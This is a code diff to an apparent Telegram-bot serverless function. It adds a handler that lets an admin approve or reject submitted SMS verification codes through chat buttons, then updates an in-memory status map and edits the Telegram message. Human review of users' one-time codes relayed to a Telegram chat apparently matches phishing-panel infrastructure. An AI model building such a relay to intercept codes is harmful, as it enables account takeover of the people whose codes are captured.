@@ -7,6 +7,13 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
+// Global store for verification statuses
+// In production, this should be stored in a database
+const verificationStatuses = new Map<string, {
+  status: 'pending' | 'approved' | 'rejected',
+  timestamp: number
+}>();
+
 interface TelegramSettings {
   bot_token: string;
   info_chat_id: string;
@@ -159,6 +166,83 @@ serve(async (req) => {
           console.log('Edit message result:', editResult);
         } else {
           console.log('Invalid callback data format:', callbackQuery.data);
+        }
+      }
+      // Handle verification callbacks (approve/reject SMS codes)
+      else if (callbackQuery.data && (callbackQuery.data.startsWith('verify_approve_') || callbackQuery.data.startsWith('verify_reject_'))) {
+        const parts = callbackQuery.data.split('_');
+        console.log('Verification callback data parts:', parts);
+        
+        if (parts.length >= 3) {
+          const action = parts[1]; // approve or reject
+          const verificationId = parts.slice(2).join('_'); // rejoin the verification ID
+          
+          console.log(`Processing verification ${verificationId} with action ${action}`);
+          
+          // Update verification status in global store
+          const status = action === 'approve' ? 'approved' : 'rejected';
+          verificationStatuses.set(verificationId, {
+            status,
+            timestamp: Date.now()
+          });
+          
+          console.log(`Verification ${verificationId} status updated to: ${status}`);
+          
+          // Send confirmation message back to admin
+          const confirmationMessages = {
+            approve: '✅ SMS verification approved',
+            reject: '❌ SMS verification rejected - Wrong code'
+          };
+          
+          console.log('Sending verification callback answer...');
+          const callbackResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/answerCallbackQuery`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              callback_query_id: callbackQuery.id,
+              text: confirmationMessages[action as keyof typeof confirmationMessages] || 'Verification processed'
+            })
+          });
+          
+          const callbackResult = await callbackResponse.json();
+          console.log('Verification callback answer result:', callbackResult);
+          
+          // Edit the original message to show it's been processed
+          console.log('Editing verification message...');
+          const currentTime = new Date().toLocaleString('en-US', {
+            year: 'numeric',
+            month: 'short',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            timeZone: 'UTC'
+          });
+          
+          const adminName = callbackQuery.from?.first_name || callbackQuery.from?.username || 'Admin';
+          const actionEmoji = action === 'approve' ? '✅' : '❌';
+          
+          // Get original message text
+          const originalText = callbackQuery.message.text;
+          
+          const newMessageText = originalText + 
+            `\n\n${actionEmoji} PROCESSED by ${adminName}\n` +
+            `⏰ Time: ${currentTime} UTC\n` +
+            `✅ Action: ${confirmationMessages[action as keyof typeof confirmationMessages]}`;
+          
+          const editResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/editMessageText`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: callbackQuery.message.chat.id,
+              message_id: callbackQuery.message.message_id,
+              text: newMessageText
+            })
+          });
+          
+          const editResult = await editResponse.json();
+          console.log('Verification edit message result:', editResult);
+        } else {
+          console.log('Invalid verification callback data format:', callbackQuery.data);
         }
       }
       // Handle SMS verification callbacks
